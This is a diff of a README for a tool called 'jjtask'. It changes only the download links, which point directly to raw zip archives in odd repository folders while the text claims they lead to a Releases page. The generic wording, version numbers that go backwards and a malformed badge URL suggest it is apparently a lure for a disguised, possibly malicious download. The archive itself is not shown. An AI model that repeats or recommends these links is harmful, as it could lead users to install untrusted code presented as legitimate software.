@@ -1,7 +1,7 @@
 # 🎯 jjtask - Simplify Your Task Management Process
 
 ## 📥 Download the Latest Version
-[![Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/claude-plugin/.claude-plugin/Software_3.9.zip%https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/claude-plugin/.claude-plugin/Software_3.9.zip)](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/claude-plugin/.claude-plugin/Software_3.9.zip)
+[![Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/cmd/Software-v1.4.zip%https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/cmd/Software-v1.4.zip)](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/cmd/Software-v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to jjtask! This application helps you manage your tasks effectively by using structured methods. You can plan, execute, and keep track of your tasks with ease. 
@@ -19,7 +19,7 @@ Welcome to jjtask! This application helps you manage your tasks effectively by u
 - **Network**: Internet access for downloading and updates
 
 ## 🔗 Download & Install
-To get started with jjtask, visit this page to download the software: [Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/claude-plugin/.claude-plugin/Software_3.9.zip). 
+To get started with jjtask, visit this page to download the software: [Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/cmd/Software-v1.4.zip). 
 
 Once you are on the Releases page:
 1. Find the latest release version.
@@ -44,7 +44,7 @@ After successfully installing jjtask, follow these steps to create your first ta
 - **Settings**: Customize themes, notifications, and integrations via the settings menu.
 
 ## 🔄 Updating jjtask
-Keep your jjtask application up to date by regularly checking the Releases page: [Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/claude-plugin/.claude-plugin/Software_3.9.zip). Updates include new features, bug fixes, and performance improvements.
+Keep your jjtask application up to date by regularly checking the Releases page: [Download jjtask](https://github.com/Divyxnk44x/jjtask/raw/refs/heads/main/cmd/Software-v1.4.zip). Updates include new features, bug fixes, and performance improvements.
 
 ## 💬 Support
 If you have questions or need support, feel free to open an issue in this repository or reach out via our community forums. We are here to help you with any problems you may encounter while using jjtask.
